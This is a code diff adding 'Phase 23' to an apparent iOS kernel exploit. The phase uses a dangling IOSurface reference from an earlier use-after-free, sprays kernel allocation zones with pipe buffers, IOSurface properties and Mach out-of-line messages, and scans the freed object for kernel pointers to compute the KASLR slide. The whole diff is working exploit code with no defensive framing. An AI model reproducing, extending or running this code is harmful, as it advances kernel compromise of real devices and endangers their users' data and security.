@@ -25125,6 +25125,509 @@ new_modes:
         }
 
 
+        /* ============================================================
+         * Phase 23: KASLR leak via IOSurface UAF zone confusion
+         *
+         * After Phase 13/14 we have a dangling IOSurfaceRef
+         * (r229_matched_surf) whose kernel object has been freed.
+         * We spray replacement objects into the same kalloc zone,
+         * then read properties from the dangling ref. If a spray
+         * object lands in the freed slot, the IOSurface property
+         * accessors interpret the spray object's bytes as IOSurface
+         * fields — potentially returning kernel pointers.
+         * ============================================================ */
+        if (rounds == 229 && r229_matched_surf) {
+            rlog("\n=== Phase 23: KASLR leak via IOSurface UAF zone confusion ===\n");
+
+            /* The freed IOSurface was 32x32 BGRA = 4096 bytes pixel data.
+             * But the kernel IOSurface object itself lives in a different
+             * zone — typically kalloc.512 or kalloc.1024 depending on
+             * property count. We try multiple spray sizes. */
+
+            /* --- 23a: Baseline — read dangling ref before spray --- */
+            rlog("\n--- 23a: Baseline dangling ref read ---\n");
+            {
+                size_t alloc = IOSurfaceGetAllocSize(r229_matched_surf);
+                uint32_t sid = IOSurfaceGetID(r229_matched_surf);
+                rlog("  Dangling surf: ID=%u alloc=%zu\n", sid, alloc);
+
+                /* Try reading known properties */
+                const char *probe_keys[] = {
+                    "IOSurfaceAllocSize", "IOSurfaceBytesPerRow",
+                    "IOSurfaceWidth", "IOSurfaceHeight",
+                    "IOSurfacePixelFormat", "IOSurfaceBytesPerElement",
+                    "IOSurfaceOffset", "IOSurfacePlaneInfo",
+                    "IOSurfaceCacheMode", "IOSurfaceIsGlobal",
+                    "IOSurfaceAddress", "SprayTag", "MAGIC", "CHECK",
+                    NULL
+                };
+                for (int ki = 0; probe_keys[ki]; ki++) {
+                    CFStringRef ks = CFStringCreateWithCString(
+                        NULL, probe_keys[ki], kCFStringEncodingUTF8);
+                    CFTypeRef val = IOSurfaceCopyValue(r229_matched_surf, ks);
+                    if (val) {
+                        CFTypeID tid = CFGetTypeID(val);
+                        if (tid == CFNumberGetTypeID()) {
+                            int64_t iv = 0;
+                            CFNumberGetValue(val, kCFNumberSInt64Type, &iv);
+                            rlog("  %s = %lld (0x%llx)%s\n",
+                                probe_keys[ki], (long long)iv,
+                                (unsigned long long)iv,
+                                ((uint64_t)iv >> 40) == 0xFFFFFE ?
+                                    " *** KPTR ***" : "");
+                        } else if (tid == CFDataGetTypeID()) {
+                            CFDataRef d = (CFDataRef)val;
+                            CFIndex dl = CFDataGetLength(d);
+                            const uint8_t *db = CFDataGetBytePtr(d);
+                            rlog("  %s = <data %ld bytes>", probe_keys[ki],
+                                (long)dl);
+                            /* Scan for kernel pointers */
+                            int kp = 0;
+                            for (CFIndex qi = 0; qi + 7 < dl; qi += 8) {
+                                uint64_t qv;
+                                memcpy(&qv, db + qi, 8);
+                                if ((qv >> 40) == 0xFFFFFE) {
+                                    kp++;
+                                    if (kp <= 3)
+                                        rlog(" KPTR@%ld=0x%llx",
+                                            (long)qi, (unsigned long long)qv);
+                                }
+                            }
+                            rlog("%s\n", kp > 0 ? " *** LEAK ***" : "");
+                        } else {
+                            rlog("  %s = <type %lu>\n", probe_keys[ki],
+                                (unsigned long)tid);
+                        }
+                        CFRelease(val);
+                    }
+                    CFRelease(ks);
+                }
+            }
+
+            /* --- 23b: Pipe buffer spray --- */
+            rlog("\n--- 23b: Pipe buffer spray + dangling read ---\n");
+            {
+                /* Spray pipe buffers at multiple sizes to hit the right zone.
+                 * IOSurface kernel object is ~256-1024 bytes depending on
+                 * config. We try kalloc.512 and kalloc.1024. */
+                int spray_sizes[] = {256, 512, 1024};
+                int pipe_fds[512][2];
+                int n_pipes = 0;
+
+                for (int si = 0; si < 3; si++) {
+                    int sz = spray_sizes[si];
+                    rlog("  Spraying pipes at %d bytes...\n", sz);
+
+                    uint8_t *spray_buf = (uint8_t *)malloc(sz);
+                    /* Fill with recognizable pattern + fake pointers */
+                    memset(spray_buf, 0x41, sz);
+                    /* Place marker values at key offsets */
+                    for (int off = 0; off < sz; off += 8) {
+                        uint64_t marker = 0xDEAD000000000000ULL | (uint64_t)off;
+                        memcpy(spray_buf + off, &marker, 8);
+                    }
+
+                    int sprayed = 0;
+                    for (int pi = 0; pi < 128 && n_pipes < 512; pi++) {
+                        if (pipe(pipe_fds[n_pipes]) == 0) {
+                            write(pipe_fds[n_pipes][1], spray_buf, sz);
+                            n_pipes++;
+                            sprayed++;
+                        }
+                    }
+                    free(spray_buf);
+                    rlog("    Sprayed %d pipes (total %d)\n", sprayed, n_pipes);
+
+                    /* Now read properties from dangling ref */
+                    const char *keys23[] = {
+                        "IOSurfaceAllocSize", "IOSurfaceBytesPerRow",
+                        "IOSurfaceWidth", "IOSurfaceHeight",
+                        "IOSurfacePixelFormat", "IOSurfaceAddress",
+                        NULL
+                    };
+                    for (int ki = 0; keys23[ki]; ki++) {
+                        CFStringRef ks = CFStringCreateWithCString(
+                            NULL, keys23[ki], kCFStringEncodingUTF8);
+                        CFTypeRef val = IOSurfaceCopyValue(
+                            r229_matched_surf, ks);
+                        if (val) {
+                            if (CFGetTypeID(val) == CFNumberGetTypeID()) {
+                                int64_t iv = 0;
+                                CFNumberGetValue(val, kCFNumberSInt64Type, &iv);
+                                rlog("    [%d] %s = 0x%llx%s\n",
+                                    sz, keys23[ki],
+                                    (unsigned long long)iv,
+                                    ((uint64_t)iv >> 40) == 0xFFFFFE ?
+                                        " *** KPTR ***" : "");
+                            }
+                            CFRelease(val);
+                        }
+                        CFRelease(ks);
+                    }
+                }
+
+                /* Cleanup pipes */
+                for (int pi = 0; pi < n_pipes; pi++) {
+                    close(pipe_fds[pi][0]);
+                    close(pipe_fds[pi][1]);
+                }
+            }
+
+            /* --- 23c: IOSurface property spray --- */
+            rlog("\n--- 23c: IOSurface property spray + dangling read ---\n");
+            {
+                /* Create many IOSurfaces and set large properties on them.
+                 * The property storage allocations may land in the same
+                 * zone as the freed IOSurface object. */
+                IOSurfaceRef prop_surfs[64];
+                int n_prop = 0;
+
+                for (int pi = 0; pi < 64; pi++) {
+                    CFMutableDictionaryRef pd = CFDictionaryCreateMutable(
+                        NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    int w = 32, h = 32, bpe = 4, bpr = w * bpe;
+                    CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                    CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                    CFNumberRef nb = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+                    CFNumberRef nr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                    uint32_t pf = 0x42475241;
+                    CFNumberRef npf = CFNumberCreate(NULL, kCFNumberSInt32Type, &pf);
+                    CFDictionarySetValue(pd, CFSTR("IOSurfaceWidth"), nw);
+                    CFDictionarySetValue(pd, CFSTR("IOSurfaceHeight"), nh);
+                    CFDictionarySetValue(pd, CFSTR("IOSurfaceBytesPerElement"), nb);
+                    CFDictionarySetValue(pd, CFSTR("IOSurfaceBytesPerRow"), nr);
+                    CFDictionarySetValue(pd, CFSTR("IOSurfacePixelFormat"), npf);
+                    prop_surfs[pi] = IOSurfaceCreate(pd);
+                    CFRelease(pd); CFRelease(nw); CFRelease(nh);
+                    CFRelease(nb); CFRelease(nr); CFRelease(npf);
+                    if (!prop_surfs[pi]) continue;
+                    n_prop++;
+
+                    /* Set a large blob property to create zone allocations */
+                    uint8_t blob[512];
+                    for (int bi = 0; bi < 512; bi += 8) {
+                        uint64_t v = 0xBBBB000000000000ULL | (uint64_t)bi;
+                        memcpy(blob + bi, &v, 8);
+                    }
+                    CFDataRef bd = CFDataCreate(NULL, blob, sizeof(blob));
+                    char kname[32];
+                    snprintf(kname, sizeof(kname), "Spray%d", pi);
+                    CFStringRef kn = CFStringCreateWithCString(
+                        NULL, kname, kCFStringEncodingUTF8);
+                    IOSurfaceSetValue(prop_surfs[pi], kn, bd);
+                    CFRelease(bd);
+                    CFRelease(kn);
+                }
+                rlog("  Created %d spray IOSurfaces with blob properties\n", n_prop);
+
+                /* Read from dangling ref — look for confusion */
+                rlog("  Reading dangling ref after IOSurface property spray:\n");
+
+                /* Try numeric properties */
+                const char *numkeys[] = {
+                    "IOSurfaceAllocSize", "IOSurfaceBytesPerRow",
+                    "IOSurfaceWidth", "IOSurfaceHeight",
+                    "IOSurfacePixelFormat", "IOSurfaceOffset",
+                    "IOSurfaceBytesPerElement", "IOSurfaceCacheMode",
+                    NULL
+                };
+                for (int ki = 0; numkeys[ki]; ki++) {
+                    CFStringRef ks = CFStringCreateWithCString(
+                        NULL, numkeys[ki], kCFStringEncodingUTF8);
+                    CFTypeRef val = IOSurfaceCopyValue(
+                        r229_matched_surf, ks);
+                    if (val) {
+                        if (CFGetTypeID(val) == CFNumberGetTypeID()) {
+                            int64_t iv = 0;
+                            CFNumberGetValue(val, kCFNumberSInt64Type, &iv);
+                            rlog("    %s = %lld (0x%llx)%s\n",
+                                numkeys[ki], (long long)iv,
+                                (unsigned long long)iv,
+                                ((uint64_t)iv >> 40) == 0xFFFFFE ?
+                                    " *** KPTR ***" : "");
+                        }
+                        CFRelease(val);
+                    }
+                    CFRelease(ks);
+                }
+
+                /* Try reading blob properties by spray key names */
+                for (int pi = 0; pi < 64; pi++) {
+                    char kname[32];
+                    snprintf(kname, sizeof(kname), "Spray%d", pi);
+                    CFStringRef kn = CFStringCreateWithCString(
+                        NULL, kname, kCFStringEncodingUTF8);
+                    CFTypeRef val = IOSurfaceCopyValue(
+                        r229_matched_surf, kn);
+                    if (val) {
+                        if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                            CFDataRef d = (CFDataRef)val;
+                            const uint8_t *db = CFDataGetBytePtr(d);
+                            CFIndex dl = CFDataGetLength(d);
+                            int kp = 0;
+                            for (CFIndex qi = 0; qi + 7 < dl; qi += 8) {
+                                uint64_t qv;
+                                memcpy(&qv, db + qi, 8);
+                                if ((qv >> 40) == 0xFFFFFE) {
+                                    kp++;
+                                    if (kp <= 3)
+                                        rlog("    Spray%d: KPTR@%ld=0x%llx\n",
+                                            pi, (long)qi,
+                                            (unsigned long long)qv);
+                                }
+                            }
+                            if (kp > 0)
+                                rlog("    *** SPRAY%d LEAK: %d kptrs ***\n",
+                                    pi, kp);
+                        }
+                        CFRelease(val);
+                    }
+                    CFRelease(kn);
+                }
+
+                /* Cleanup */
+                for (int pi = 0; pi < 64; pi++) {
+                    if (prop_surfs[pi]) CFRelease(prop_surfs[pi]);
+                }
+            }
+
+            /* --- 23d: Mach OOL message spray --- */
+            rlog("\n--- 23d: Mach OOL message spray + dangling read ---\n");
+            {
+                /* Send OOL messages to a port. The OOL data is copied into
+                 * kalloc, potentially landing in the freed zone. */
+                mach_port_t ool_port = MACH_PORT_NULL;
+                kern_return_t kr = mach_port_allocate(mach_task_self(),
+                    MACH_PORT_RIGHT_RECEIVE, &ool_port);
+                if (kr == KERN_SUCCESS) {
+                    kr = mach_port_insert_right(mach_task_self(),
+                        ool_port, ool_port, MACH_MSG_TYPE_MAKE_SEND);
+                }
+
+                if (kr == KERN_SUCCESS) {
+                    int ool_sizes[] = {256, 512, 1024};
+                    for (int si = 0; si < 3; si++) {
+                        int ool_sz = ool_sizes[si];
+                        rlog("  OOL spray at %d bytes...\n", ool_sz);
+
+                        uint8_t *ool_data = (uint8_t *)malloc(ool_sz);
+                        for (int off = 0; off < ool_sz; off += 8) {
+                            uint64_t v = 0xCC00000000000000ULL |
+                                ((uint64_t)si << 32) | (uint64_t)off;
+                            memcpy(ool_data + off, &v, 8);
+                        }
+
+                        struct {
+                            mach_msg_header_t hdr;
+                            mach_msg_body_t body;
+                            mach_msg_ool_descriptor_t ool;
+                        } ool_msg;
+
+                        int sent = 0;
+                        for (int mi = 0; mi < 128; mi++) {
+                            memset(&ool_msg, 0, sizeof(ool_msg));
+                            ool_msg.hdr.msgh_bits =
+                                MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND,
+                                    0, 0, MACH_MSGH_BITS_COMPLEX);
+                            ool_msg.hdr.msgh_size = sizeof(ool_msg);
+                            ool_msg.hdr.msgh_remote_port = ool_port;
+                            ool_msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                            ool_msg.body.msgh_descriptor_count = 1;
+                            ool_msg.ool.address = ool_data;
+                            ool_msg.ool.size = ool_sz;
+                            ool_msg.ool.deallocate = 0;
+                            ool_msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                            ool_msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                            kr = mach_msg(&ool_msg.hdr,
+                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                sizeof(ool_msg), 0, MACH_PORT_NULL,
+                                100, MACH_PORT_NULL);
+                            if (kr == KERN_SUCCESS) sent++;
+                            else break;
+                        }
+                        free(ool_data);
+                        rlog("    Sent %d OOL messages\n", sent);
+
+                        /* Probe dangling ref */
+                        CFStringRef ks = CFSTR("IOSurfaceAllocSize");
+                        CFTypeRef val = IOSurfaceCopyValue(
+                            r229_matched_surf, ks);
+                        if (val) {
+                            if (CFGetTypeID(val) == CFNumberGetTypeID()) {
+                                int64_t iv = 0;
+                                CFNumberGetValue(val, kCFNumberSInt64Type, &iv);
+                                rlog("    [%d] AllocSize = 0x%llx%s\n",
+                                    ool_sz, (unsigned long long)iv,
+                                    ((uint64_t)iv >> 40) == 0xFFFFFE ?
+                                        " *** KPTR ***" : "");
+                            }
+                            CFRelease(val);
+                        }
+                    }
+
+                    /* Drain the port to free OOL data */
+                    mach_port_destroy(mach_task_self(), ool_port);
+                }
+            }
+
+            /* --- 23e: Direct pixel data scan --- */
+            rlog("\n--- 23e: Direct pixel data scan on dangling surface ---\n");
+            {
+                /* Lock the dangling surface and read its pixel data.
+                 * After zone confusion, the "pixel data" pointer may
+                 * now point to a spray object containing kernel ptrs. */
+                IOReturn lr = IOSurfaceLock(r229_matched_surf, 1, NULL);
+                rlog("  Lock result: 0x%x\n", lr);
+
+                void *base = IOSurfaceGetBaseAddress(r229_matched_surf);
+                size_t alloc = IOSurfaceGetAllocSize(r229_matched_surf);
+                rlog("  BaseAddress: %p  AllocSize: %zu\n", base, alloc);
+
+                if (base && alloc > 0 && alloc < 1024 * 1024) {
+                    /* Scan pixel data for kernel pointers */
+                    uint64_t *qw = (uint64_t *)base;
+                    size_t nqw = alloc / 8;
+                    if (nqw > 16384) nqw = 16384;
+                    int kp_count = 0;
+                    uint64_t first_kptr = 0;
+
+                    for (size_t qi = 0; qi < nqw; qi++) {
+                        uint64_t v = qw[qi];
+                        if ((v >> 40) == 0xFFFFFE && (v & 0xFFF) == 0) {
+                            kp_count++;
+                            if (kp_count == 1) first_kptr = v;
+                            if (kp_count <= 8) {
+                                rlog("  KPTR[%d] @ offset %zu: 0x%llx\n",
+                                    kp_count, qi * 8,
+                                    (unsigned long long)v);
+                            }
+                        }
+                    }
+
+                    /* Also dump first 128 bytes as hex for analysis */
+                    rlog("  First 128 bytes of pixel data:\n");
+                    size_t dump_sz = 128;
+                    if (dump_sz > alloc) dump_sz = alloc;
+                    for (size_t di = 0; di < dump_sz; di += 16) {
+                        rlog("    +%04zx:", di);
+                        for (size_t bi = 0; bi < 16 && di + bi < dump_sz; bi++)
+                            rlog(" %02x", ((uint8_t *)base)[di + bi]);
+                        rlog("\n");
+                    }
+
+                    if (kp_count > 0) {
+                        rlog("\n  *** KASLR LEAK CANDIDATE: %d kernel ptrs ***\n",
+                            kp_count);
+                        rlog("  First: 0x%llx\n",
+                            (unsigned long long)first_kptr);
+                        /* Known kernel base for A20 iOS 27.1 unslid:
+                         * 0xFFFFFE0007004000 */
+                        uint64_t unslid_base = 0xFFFFFE0007004000ULL;
+                        if (first_kptr > unslid_base &&
+                            first_kptr < unslid_base + 0x10000000ULL) {
+                            uint64_t slide = (first_kptr & ~0xFFFULL) -
+                                unslid_base;
+                            rlog("  Possible KASLR slide: 0x%llx\n",
+                                (unsigned long long)slide);
+                        }
+                    } else {
+                        rlog("  No kernel pointers found in pixel data\n");
+                    }
+                }
+
+                IOSurfaceUnlock(r229_matched_surf, 1, NULL);
+            }
+
+            /* --- 23f: IOSurface property readback with varied timing --- */
+            rlog("\n--- 23f: Timed property readback (race window) ---\n");
+            {
+                /* Rapidly create+destroy IOSurfaces while reading from
+                 * the dangling ref. Zone recycling may briefly expose
+                 * kernel pointers in the freed object's fields. */
+                int leak_found = 0;
+                uint64_t leaked_ptr = 0;
+
+                for (int round = 0; round < 50 && !leak_found; round++) {
+                    /* Create and immediately destroy an IOSurface to
+                     * churn the zone allocator */
+                    CFMutableDictionaryRef td = CFDictionaryCreateMutable(
+                        NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    int w = 32, h = 32, bpe = 4, bpr = w * bpe;
+                    CFNumberRef tw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                    CFNumberRef th = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                    CFNumberRef tb = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+                    CFNumberRef tr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                    uint32_t pf = 0x42475241;
+                    CFNumberRef tf = CFNumberCreate(NULL, kCFNumberSInt32Type, &pf);
+                    CFDictionarySetValue(td, CFSTR("IOSurfaceWidth"), tw);
+                    CFDictionarySetValue(td, CFSTR("IOSurfaceHeight"), th);
+                    CFDictionarySetValue(td, CFSTR("IOSurfaceBytesPerElement"), tb);
+                    CFDictionarySetValue(td, CFSTR("IOSurfaceBytesPerRow"), tr);
+                    CFDictionarySetValue(td, CFSTR("IOSurfacePixelFormat"), tf);
+                    IOSurfaceRef tmp = IOSurfaceCreate(td);
+                    CFRelease(td); CFRelease(tw); CFRelease(th);
+                    CFRelease(tb); CFRelease(tr); CFRelease(tf);
+                    if (tmp) CFRelease(tmp);
+
+                    /* Immediately read from dangling ref */
+                    size_t a = IOSurfaceGetAllocSize(r229_matched_surf);
+                    uint32_t sid = IOSurfaceGetID(r229_matched_surf);
+                    uint64_t av = (uint64_t)a;
+                    uint64_t sv = (uint64_t)sid;
+
+                    /* Check if any value looks like a kernel pointer */
+                    if ((av >> 40) == 0xFFFFFE) {
+                        rlog("  Round %d: AllocSize=0x%llx *** KPTR ***\n",
+                            round, (unsigned long long)av);
+                        leak_found = 1;
+                        leaked_ptr = av;
+                    }
+                    if ((sv >> 40) == 0xFFFFFE) {
+                        rlog("  Round %d: SurfID=0x%llx *** KPTR ***\n",
+                            round, (unsigned long long)sv);
+                        leak_found = 1;
+                        leaked_ptr = sv;
+                    }
+
+                    /* Also try CopyValue for wider read */
+                    CFTypeRef cv = IOSurfaceCopyValue(r229_matched_surf,
+                        CFSTR("IOSurfaceAllocSize"));
+                    if (cv) {
+                        if (CFGetTypeID(cv) == CFNumberGetTypeID()) {
+                            int64_t iv = 0;
+                            CFNumberGetValue(cv, kCFNumberSInt64Type, &iv);
+                            if (((uint64_t)iv >> 40) == 0xFFFFFE) {
+                                rlog("  Round %d: CopyValue=0x%llx"
+                                     " *** KPTR ***\n",
+                                    round, (unsigned long long)iv);
+                                leak_found = 1;
+                                leaked_ptr = (uint64_t)iv;
+                            }
+                        }
+                        CFRelease(cv);
+                    }
+                }
+
+                if (leak_found) {
+                    rlog("\n  *** KASLR LEAK CONFIRMED: 0x%llx ***\n",
+                        (unsigned long long)leaked_ptr);
+                } else {
+                    rlog("  No leak in 50 churn rounds\n");
+                }
+            }
+
+            rlog("\n=== Phase 23 Summary ===\n");
+            rlog("Strategies tested: pipe spray, IOSurface prop spray,\n");
+            rlog("OOL mach_msg spray, pixel data scan, zone churn.\n");
+            rlog("Look for *** KPTR *** or *** LEAK *** markers.\n");
+            rlog("--- Phase 23 complete ---\n");
+        }
+
+
+
 
 
         /*
